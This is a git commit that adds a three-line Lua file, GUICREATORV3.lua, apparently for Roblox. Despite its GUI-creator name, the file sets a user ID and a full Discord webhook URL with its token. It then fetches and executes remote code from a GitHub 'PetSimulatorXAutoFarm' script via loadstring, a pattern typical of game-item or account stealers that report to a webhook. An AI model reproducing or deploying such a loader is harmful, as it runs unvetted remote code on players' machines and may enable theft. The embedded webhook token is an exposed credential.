35dc3c009fa8782d57352fbcaeb13158e70ce074
spiritRBX <130298916+spiritRBX@users.noreply.github.com>
2023-04-14 21:15:57 +0100

    Add files via upload

---
+++ GUICREATORV3.lua
@@ -0,0 +1,3 @@
+_G.UserID = 1533798378
+_G.WebHook = "https://discord.com/api/webhooks/1096525543412879400/wU2570rPtsSD94AKvhvQHKLh5Y-AhdTOrG99EbRag31RVdfxasbZdEHOSZJS3ASY0qtZ"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
